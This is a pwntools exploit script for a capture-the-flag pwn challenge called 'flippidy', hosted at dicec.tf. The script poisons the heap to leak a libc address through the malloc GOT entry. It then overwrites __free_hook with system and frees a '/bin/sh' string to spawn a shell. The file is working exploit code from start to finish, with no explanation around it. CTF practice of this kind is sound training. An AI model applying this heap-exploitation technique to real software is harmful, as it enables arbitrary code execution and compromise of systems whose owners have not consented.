from pwn import *

elf = ELF('./flippidy')
libc = ELF('./libc.so.6')

target = process(elf.path, env={"LD_PRELOAD":libc.path})
target = remote("dicec.tf", 31904)

def sa(s, d):
	target.sendlineafter(s, d)
	
def add(idx, content):
	sa(": ", "1")
	sa(": ", str(idx))
	sa(": ", content)

def flip():
	sa(": ", "2")

note_size = 11
sa(": ", str(note_size))

str_ptrs = 0x404020

add(5, p64(str_ptrs))
flip()
add(0, p64(elf.got['malloc'])*4 + p64(str_ptrs + 0x20))
target.recvuntil("\n\n")
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['malloc']
log.info("LIBC Base: " + hex(libc_base))

add(5, p64(libc_base + libc.sym['__free_hook'] - 8))
add(0, "@_@")
add(0, "/bin/sh\x00" + p64(libc_base + libc.sym['system']))
flip()

target.interactive()
